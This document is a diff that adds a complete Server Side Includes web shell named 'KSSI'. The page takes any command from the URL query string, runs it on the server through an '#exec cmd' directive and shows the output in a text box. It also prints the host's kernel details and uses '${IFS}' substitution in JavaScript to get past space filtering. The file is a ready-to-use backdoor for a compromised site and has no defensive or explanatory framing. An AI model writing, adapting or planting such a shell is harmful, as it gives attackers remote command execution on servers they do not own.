@@ -1,0 +1,76 @@
+<!-- Author : Unknown45 -->
+<!-- hargai author dengan cara menggunakan script ini tanpa mengrecode script ini !! -->
+
+<!--#config errmsg="[Error in shell]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="ls -la" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://1-220-11328-1.b.cdn13.com/pictures/781x439/677027.jpg" type="image/x-icon">
+    <title>KSSI</title>
+    
+    <!-- jquery -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    
+    <!-- bypass ifs -->
+    <script language="javascript">
+        function fex(){
+	        var uri = document.getElementById('command').value;
+	        var rep = uri.replace(/[ ]/g,'${IFS}');
+	        var res = encodeURI(uri);
+	        document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+        }
+    </script>
+
+    <!-- bypass ifs -->
+    <script>
+        document.onkeydown = keydown;
+        function keydown(e) {
+            if (!e) e = event;
+            if (e.keyCode === 13) {
+    	    var uri = document.getElementById('command').value;
+    	    var rep = uri.replace(/[ ]/g,'${IFS}');
+		    var res = encodeURI(uri);
+            document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+        }
+    }
+    </script>
+
+</head>
+
+<style>
+    body{
+        background-color: black;
+        font-family: "Comic Sans MS", cursive, sans-serif;
+        font-size: 15px;
+        color: white;
+    }
+</style>
+
+<body>
+    <i>Server : <font color=green><!--#exec cmd="{uname,-nr}" --></font><br>
+    Command : <input type=text size=60 id=command class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<input type=button value=Execute onclick="fex();">
+        <hr>
+    Executed Command : </font><b><!--#echo var=shl --></b><br>
+
+<textarea bgcolor=#e4e0d8 cols=121 rows=15>
+<!--#exec cmd=$shl -->
+</textarea>
+
+<script>
+//$('body').on('input', 'input[name=address1]', function() {
+//  $(this).val($(this).val().replace(' ', '${IFS}'));
+//});
+</script>
+
+<hr>
+</body>
+</html>
